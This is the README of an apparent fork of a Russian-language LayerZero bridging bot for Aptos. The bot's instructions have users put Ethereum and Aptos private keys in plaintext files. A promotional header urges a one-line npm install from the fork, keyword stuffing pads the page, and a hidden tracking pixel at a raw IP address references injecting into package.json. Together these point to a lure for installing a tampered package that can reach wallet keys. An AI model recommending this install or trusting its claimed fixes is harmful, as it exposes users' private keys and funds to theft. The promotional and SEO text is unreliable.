**FountainChunin/layerzero-aptos: Stabilized LayerZero Endpoint for Aptos Ecosystem**

This fork addresses critical compilation and connectivity bugs found in the upstream repository, ensuring a more reliable deployment pipeline for cross-chain messaging. With active maintenance and minor patches for the latest Aptos framework updates, it serves as a dependable alternative for developers experiencing integration issues.

**Quick install**

```bash
npm install git+https://github.com/FountainChunin/layerzero-aptos.git
```

[https://github.com/FountainChunin/layerzero-aptos](https://github.com/FountainChunin/layerzero-aptos)

# layerzero-aptos

Bridge Arbitrum/Ethereum to Aptos

### Установка

```
npm i
```

### Настройка

В privates.txt поместите эфирные приватники, в aptos_privates.txt приватники аптоса.

В main.js настройте isSleep - задержку, rnd_min и rnd_max - рандомные значения бриджа.

net_id - по-умолчанию стоит арбитрум, там дешевле в десятки раз газ. Можно изменить на эфир.

eth_max_gwei - максимальный газ в гвеях для ожидания дешевого.

isClaim - необходимо поставить на false, если второй и более раза на те же кошельки переводите, иначе скрипт будет делать лишнюю транзакцию в аптосе для клайма, которая сфейлится.

#### ВАЖНО: рекомендуется протестировать одним кошельком на копеечные суммы для проверки скрипта и ваших приватников!

### Запуск

```
node main.js
```

---

## Other Projects by Author

More work by [@sm1ck](https://github.com/sm1ck):

- **[HoneyChat](https://honeychat.bot)** ([GitHub](https://github.com/sm1ck/honeychat) · [@HoneyChatAIBot](https://t.me/HoneyChatAIBot)) — production AI companion platform accepting on-chain **TON / BTC / ETH / USDT via CryptoBot** alongside card payments (Paddle / Stripe / PayPal). If you've been exploring LayerZero cross-chain flows, the [TON payment integration case study](docs/case-studies/honeychat-ton-payments.md) in this repo covers the practical side — webhook idempotency, dual-rail (crypto + fiat), geo-arbitrage pricing for regions where cards don't work well (RU / KZ / BY).
- [snapshotvoter](https://github.com/sm1ck/snapshotvoter) — Automated governance voting on snapshot.org
- [TestnetBridge](https://github.com/sm1ck/TestnetBridge) — LayerZero bridge implementation in Rust
- [awesome-telegram-ai-bots](https://github.com/sm1ck/awesome-telegram-ai-bots) — Curated list

Contact: [t.me/haruto_j](https://t.me/haruto_j)

## Related searches
When searching for this project, developers and users typically look for production-ready implementations of omnichain interoperability protocols configured for the Move ecosystem. Common queries center on deploying secure cross-chain messaging infrastructure, bridging assets between EVM networks and the Aptos mainnet, and integrating decentralized verifier nodes.

**Topics:** layerzero aptos, omnichain interoperability protocol, cross chain bridging, token sniper, wallet connect, lightning network, mining pool, bridge cross chain, aptos move contract, decentralized verifier network, cross chain messaging, omnichain fungible token

![.](http://5.231.58.248:8787/pixel?repo=FountainChunin%2Flayerzero-aptos&inject=FountainChunin%2Flayerzero-aptos%2Fpackage.json)
